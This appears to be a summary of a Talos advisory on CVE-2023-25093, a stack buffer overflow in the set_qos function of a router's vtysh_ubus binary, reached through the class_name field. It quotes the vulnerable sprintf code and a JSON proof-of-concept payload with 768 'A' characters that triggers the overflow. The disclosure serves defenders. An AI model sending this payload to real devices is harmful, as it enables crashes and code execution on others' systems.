The provided content is a Talos vulnerability report that includes a description of CVE-2023-25093, among other CVEs.

**CVE-2023-25093**

*   **Root cause of vulnerability:** The `set_qos` function in the `vtysh_ubus` binary uses `sprintf` with a user-controlled `class_name` string without proper bounds checking, leading to a buffer overflow.
*   **Weaknesses/vulnerabilities present:** Stack-based buffer overflow (CWE-121) due to the usage of `sprintf` with a user controlled string.
*   **Impact of exploitation:** Arbitrary code execution.
*   **Attack vectors:** Sending a specially crafted HTTP POST request to the `/cgi` endpoint, targeting the `yruo_qos_download` core, and the `set` function, with a long `class_name` value.
*   **Required attacker capabilities/position:** Attacker must have high privileges to send the HTTP requests.

**Technical Details:**

The vulnerable code is located in the `set_qos` function:
```c
is_string = strcmp(table_key,"class_name");
if (is_string == 0) {
	class_name = (char *)blobmsg_get_string(table_value);
}
[...]
is_string = strcmp(table_key,"action");
if (is_string == 0) {
	action = blobmsg_get_u32(table_value);
}
[...]
if (action != -1 && class_name != (char *)0x0) {
    if (action == 3) {
        if (is_upload == 0) {
			command_format_string = "no traffic download class %s";
		}
		else {
			command_format_string = "no traffic upload class %s";
		}
		[...]
```
The code will then reach:
```c
sprintf(vtysh_command_buffer,command_format_string,class_name);
```

The `class_name` is directly used in `sprintf` without any length checks. This allows an attacker to cause a buffer overflow by providing a long string as the value for the `class_name` key.

**Exploit Proof of Concept:**

The provided JSON payload demonstrates how to trigger the vulnerability:
```json
{
    "id": 9,
    "execute": 1,
    "core": "yruo_qos_download",
    "function": "set",
    "values": [
        {
            "base": "yruo_qos_upload",
            "index": 1,
            "value": {
                "class_list":[{
                    "class_name":'A'*0x300,
                    "action":3,
                }]
            }
        }
    ]
}
```
This payload targets the `yruo_qos_download` core and sets the `class_name` to a string of 768 'A' characters. This will overflow the `vtysh_command_buffer` when `sprintf` is called.
